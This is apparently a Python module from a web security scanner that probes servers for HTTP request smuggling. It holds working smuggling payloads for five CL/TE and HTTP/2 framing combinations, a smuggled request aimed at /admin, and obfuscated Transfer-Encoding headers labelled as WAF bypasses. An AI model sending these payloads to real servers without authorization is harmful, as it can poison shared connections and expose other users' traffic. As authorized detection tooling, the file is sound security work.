"""U-DEEP-4 — HTTP Request Smuggling.

Family: HTTP_SMUGGLING. Front-end and back-end disagree on where one
request ends and the next begins, and a second request is smuggled
into the pipeline. Spec corpus (verbatim structure, U-DEEP-4): five
combos — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE.

Detection principle: EFFECT OVER ECHO — a desync is only a finding
when one of three effect channels actually fires: the smuggled
canary contaminates a response it was never part of, a timing diff
against the clean baseline, or a desync-specific server error. A
mere 200 is not evidence.

Zero live network: the transport is the injected ``send(probe)``
callable carrying the raw header plan; no raw sockets are opened.
Findings are advisory evidence only (DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

import json
from dataclasses import dataclass

CANARY = "webpent-smuggle-canary"

TIMING_THRESHOLD_MS = 500

_SMUGGLED_BODY = (
    "0\r\n\r\nGPOST /admin HTTP/1.1\r\n"
    f"X-Canary: {CANARY}\r\n\r\n")

# Spec corpus, verbatim structure (U-DEEP-4): five combos.
SMUGGLING_VARIANTS: dict[str, dict] = {
    "CL.TE": {
        "headers": [("Content-Length", "13"),
                    ("Transfer-Encoding", "chunked")],
        "body": _SMUGGLED_BODY,
        "description": ("front-end uses Content-Length, back-end "
                        "uses Transfer-Encoding"),
    },
    "TE.CL": {
        "headers": [("Transfer-Encoding", "chunked"),
                    ("Content-Length", "4")],
        "body": _SMUGGLED_BODY,
        "description": ("front-end uses Transfer-Encoding, back-end "
                        "uses Content-Length"),
    },
    "TE.TE": {
        "headers": [("Transfer-Encoding", "chunked"),
                    ("Transfer-Encoding", "x")],
        "body": _SMUGGLED_BODY,
        "description": ("both use Transfer-Encoding but interpret "
                        "it differently"),
    },
    "H2.CL": {
        "headers": [("Content-Length", "13")],
        "body": _SMUGGLED_BODY,
        "http2": True,
        "description": "HTTP/2 front-end, HTTP/1.1 back-end with CL",
    },
    "H2.TE": {
        "headers": [("Transfer-Encoding", "chunked")],
        "body": _SMUGGLED_BODY,
        "http2": True,
        "description": "HTTP/2 front-end, HTTP/1.1 back-end with TE",
    },
}

# WAF bypass variants: non-canonical Transfer-Encoding spellings
# that some intermediates parse differently.
SMUGGLING_OBFUSCATIONS = (
    "Transfer-Encoding: x",
    "Transfer-Encoding\t: chunked",
    "Transfer-Encoding : chunked",
    "Transfer-encoding: CHUNKED",
)

SEVERITY_BY_SUBFAMILY = {combo: "critical" for combo
                         in SMUGGLING_VARIANTS}


@dataclass(frozen=True)
class SmugglingFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    channels: tuple[str, ...]
    family: str = "HTTP_SMUGGLING"
    confidence: float = 0.8
    statement: str = ""
    success_indicator: str = ""


class SmugglingDetector:
    """Probes each CL/TE combo through the injected transport and
    reports only probes where an effect channel fired."""

    def __init__(self, send) -> None:
        self._send = send

    # ------------------------------------------------------------------

    def build_plan(self) -> list[dict]:
        """Deterministic probe plan: one raw-framing probe per combo."""
        plan = []
        for combo, variant in SMUGGLING_VARIANTS.items():
            plan.append({
                "variant": combo,
                "headers": list(variant["headers"]),
                "body": variant["body"],
                "http2": variant.get("http2", False),
            })
        return plan

    def bypass_variants(self) -> list[dict]:
        """WAF bypass plans: the TE.TE shape with each obfuscated
        Transfer-Encoding spelling."""
        plans = []
        base = SMUGGLING_VARIANTS["TE.TE"]
        for obfuscation in SMUGGLING_OBFUSCATIONS:
            name, _, value = obfuscation.partition(":")
            value = value.strip()
            plans.append({
                "variant": f"TE.TE:{obfuscation}",
                "headers": [("Transfer-Encoding", "chunked"),
                            (name.strip(), value)],
                "body": base["body"],
                "http2": False,
            })
        return plans

    def scan(self) -> list[SmugglingFinding]:
        baseline = self._send({"method": "GET", "path": "/",
                               "headers": [], "body": "",
                               "http2": False})
        baseline_elapsed = baseline.elapsed_ms
        baseline_line = f"baseline: {baseline_elapsed}ms clean request"
        findings: list[SmugglingFinding] = []
        for probe in self.build_plan() + self.bypass_variants():
            finding = self._probe(probe, baseline_line,
                                  baseline_elapsed)
            if finding is not None:
                findings.append(finding)
        return findings

    # ------------------------------------------------------------------

    def _probe(self, probe: dict, baseline_line: str,
               baseline_elapsed: float) -> SmugglingFinding | None:
        response = self._send(probe)
        channels: list[str] = []
        evidence = [baseline_line]
        body = response.body if isinstance(response.body, str) \
            else json.dumps(response.body)
        if response.status_code >= 500:
            channels.append("server_error")
            evidence.append(
                f"server error: status {response.status_code} on the "
                f"smuggle probe: {body}")
        if CANARY in body:
            channels.append("response_contamination")
            evidence.append(
                f"response contamination: smuggled canary {CANARY} "
                "appeared in a response it was never part of")
        delta = response.elapsed_ms - baseline_elapsed
        if delta >= TIMING_THRESHOLD_MS:
            channels.append("timing_diff")
            evidence.append(
                f"elapsed: {response.elapsed_ms}ms (delta {delta}ms, "
                f"threshold {TIMING_THRESHOLD_MS}ms)")
        if not channels:
            return None
        combo = probe["variant"].split(":")[0]
        statements = {
            "server_error": (
                "The probe produced a desync-specific server error — "
                "request smuggling (advisory; verify against an "
                "authorized target)."),
            "response_contamination": (
                "A response carried the smuggled canary it was never "
                "part of — request smuggling, pipeline poisoning "
                "(advisory; verify against an authorized target)."),
            "timing_diff": (
                "The probe shows a timing diff against the clean "
                "baseline — probable desync (advisory; verify against "
                "an authorized target)."),
        }
        indicators = {
            "server_error": "500-class error unique to the smuggle "
                            "shape",
            "response_contamination": (
                "canary from request A visible in response B"),
            "timing_diff": (
                f"elapsed delta at or above {TIMING_THRESHOLD_MS}ms"),
        }
        return SmugglingFinding(
            subfamily=combo,
            severity=SEVERITY_BY_SUBFAMILY[combo],
            evidence=tuple(evidence),
            channels=tuple(channels),
            statement=" / ".join(statements[c] for c in channels),
            success_indicator=" / ".join(indicators[c]
                                         for c in channels),
        )
